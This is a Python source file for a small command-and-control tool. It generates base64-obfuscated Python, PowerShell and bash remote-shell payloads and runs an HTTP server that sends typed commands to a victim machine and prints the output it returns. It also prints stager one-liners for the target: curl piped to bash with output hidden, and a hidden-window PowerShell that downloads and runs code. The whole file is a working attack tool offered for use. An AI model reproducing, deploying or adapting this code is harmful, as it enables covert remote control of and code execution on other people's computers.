#!/usr/bin/python3
from http.server import HTTPServer , BaseHTTPRequestHandler
from os import getcwd , system
from base64 import b64encode
from time import sleep
import sys


#colors
P = "\033[1;35;48m"
R = "\033[1;31;48m"
W = "\033[1;27;48m"
G = "\033[1;32;48m"
Res = "\033[1;0;48m"

class http_request_handler(BaseHTTPRequestHandler):

    def do_GET(self):
        prompt = f"{G}{self.headers['vic']}@{self.address_string()}${Res} "
        command = str(input(prompt))
        if command.lower() == "exit":
            self.send_response_only(200)
            self.send_header("Content-type","text/html")
            self.end_headers()
            self.wfile.write(command.encode('utf-8'))
            exit()
        else:
            self.send_response_only(200)
            self.send_header("Content-type","text/html")
            self.end_headers()
            self.wfile.write(command.encode('utf-8'))

    def do_POST(self):
        self.send_response_only(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        output = self.rfile.read(length)
        print(output.decode('utf-8'))





class C2():
    def usage(self):
        print(f"""{W}usage :
  {sys.argv[0]} <SERVER-HOST> <SERVER-PORT> <PAYLOAD-TYPE>
  
e.g :
  {sys.argv[0]} 192.168.1.12 8080 py
  {sys.argv[0]} 192.168.1.12 8080 ps
  {sys.argv[0]} 192.168.1.12 8080 sh

note : available payload types are : py (python) , ps (powershell) , sh (bash)        
        {Res}""")
    
    def payload_creator(self,serverhost,serverport,payload_type):
        self.serverhost = serverhost
        self.serverport = serverport
        self.payload_type = payload_type
        
        #determine the payload type and set the payload sample
        if self.payload_type == "py":
            self.payload_sample_file = "payload_samples/payload_sample.py"
        elif self.payload_type == "ps":
            self.payload_sample_file = "payload_samples/payload_sample.ps1"
        elif self.payload_type == "sh":
            self.payload_sample_file = "payload_samples/payload_sample.sh"
        else:
            self.usage()
            exit()
        #get the payload sample
        try:
            with open(self.payload_sample_file ,'r') as payload_sample:
                code_sample = payload_sample.read()
                payload = code_sample.replace("serverhost",self.serverhost).replace("serverport",self.serverport)
                payload_sample.close()
        except Exception as e:
            print(str(e))
            exit()

        #---------- generate a python payload ----------#
        if self.payload_type == "py":
            with open('payload.py','w') as b64payload:
                base64_encoded_payload = b64encode(payload.encode())
                b64payload.write(f"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{base64_encoded_payload.decode('utf-8')}')[0]))")
                b64payload.close()
            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.py\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}python3 -c $(curl -s <LINK-TO-YOUR-PAYLOAD>) &> /dev/null{Res} \n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
        
        #---------- generate a powershell payload ---------#
        elif self.payload_type == "ps":
            with open('payload.ps1','w') as b64payload:
                base64_encoded_payload = b64encode(payload.encode('utf-16-le'))
                b64payload.write(f"powershell.exe -w 1 -E {base64_encoded_payload.decode('utf-8')} ")
                b64payload.close()
            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.ps1\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}powershell.exe -w 1 -c iex(New-Object System.Net.Webclient).downloadstring('<LINK-TO-YOUR-PAYLOAD>'){Res}\n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
        #---------- generate a bash payload -----------#
        elif self.payload_type == "sh":
            with open('payload.sh','w') as b64payload:
                base64_encoded_payload = b64encode(payload.encode())
                b64payload.write(f"echo {base64_encoded_payload.decode('utf-8')} | base64 -d | bash")
                b64payload.close()
            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.sh\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}curl -s <LINK-TO-YOUR-PAYLOAD> | bash &> /dev/null{Res} \n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
    
    
    def server(self,serverhost,serverport):
        self.serverhost = serverhost
        self.serverport = serverport
        self.server = HTTPServer
        self.httpd = self.server((f'{self.serverhost}',int(self.serverport)),http_request_handler)
        print(f"{G}[!] - http server started at {self.serverhost}:{self.serverport} ...\n{Res}")
        self.httpd.serve_forever()

    def main(self):
        try:
            srv_host = sys.argv[1]
            srv_port = sys.argv[2]
            payload_type = sys.argv[3]
            self.payload_creator(srv_host,srv_port,payload_type)
            input(f"{W}[!] - click Enter button to start the server.{Res}")
            system('clear')
            self.server(srv_host,srv_port)
        except IndexError as ie:
            self.usage()
            exit()
        except KeyboardInterrupt as ki:
            print(f"\n{R}[!] - keyboard interrupted !\n{Res}")
            try:
                self.httpd.shutdown()
            except Exception:
                exit()
            exit()
        except Exception as e:
            print(str(e))

c2server = C2()
c2server.main()


